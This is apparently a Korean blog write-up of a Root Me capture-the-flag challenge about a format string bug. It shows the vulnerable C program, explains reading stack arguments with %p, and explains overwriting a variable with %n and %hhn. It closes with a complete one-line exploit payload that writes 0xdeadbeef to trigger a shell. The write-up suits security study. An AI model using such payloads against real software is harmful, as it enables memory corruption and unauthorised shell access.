---
layout: post
title:  "Root Me: ELF x86 - Format string bug basic 2"
date:   2018-01-25 00:00:04
author: nyan101
categories: 자습
tags:	app/system
cover:  
---



주어진 코드는 다음과 같다.

```c
int main( int argc, char ** argv )
{
	int var;
	int check  = 0x04030201;
	char fmt[128];
 
	if (argc <2)
		exit(0);
 
	memset( fmt, 0, sizeof(fmt) );
 
	printf( "check at 0x%x\n", &check );
	printf( "argv[1] = [%s]\n", argv[1] );
 
	snprintf( fmt, sizeof(fmt), argv[1] );
 
	if ((check != 0x04030201) && (check != 0xdeadbeef))	
		printf ("\nYou are on the right way !\n");
 
	printf( "fmt=[%s]\n", fmt );
	printf( "check=0x%x\n", check );
 
	if (check==0xdeadbeef)
   	{
		printf("Yeah dude ! You win !\n");
     		system("/bin/dash");
   	}
}
```

`snprintf` 함수를 이용해 check 변수의 값을 조작해야 한다. printf에서와 마찬가지로 snprintf에서도 %x나 %p를 이용해 읽어올 수 있으며, `%(숫자)$p%`를 이용해 원하는 k번째 인자(혹은 해당 위치의 메모리)를 바로 읽어올 수 있다. 입력한 값이 몇 번째 위치에 들어가는지 확인하고 %n(포인터로 주어진 인자에 현재까지 쓰인 바이트 수를 기록)를 이용해 해당 주소의 값을 수정할 수 있다.

![](/assets/images/2018/01/rootme-04.png)

위 그림에서와 같이 입력값이 9번째 인자 위치부터 들어간다는 사실을 확인하면 %n을 이용해 값을 수정할 수 있다. 그런데 check가 요구하는 값(0xdeadbeef)의 크기가 커 한번에 쓰기엔 한계가 있었고, %hn(2바이트)이나 %hhn(1바이트)를 통해 하나씩 덮어쓰는 작업이 필요했다. 이 과정에서 ~~손가락이 6개 부족해서~~ 잠시 막혔다.

![](/assets/images/2018/01/rootme-04-decimal.png)



...결과적으로 아래와 같은 커맨드를 통해 조건을 통과할 수 있었다.

```
./ch14 "$(python -c "print '\x0b\xfb\xff\xbf\x0a\xfb\xff\xbf\x09\xfb\xff\xbf\x08\xfb\xff\xbf'+'%206d%9\$hhn%207d%10\$hhn%17d%11\$hhn%49d%12\$hhn'")"
```

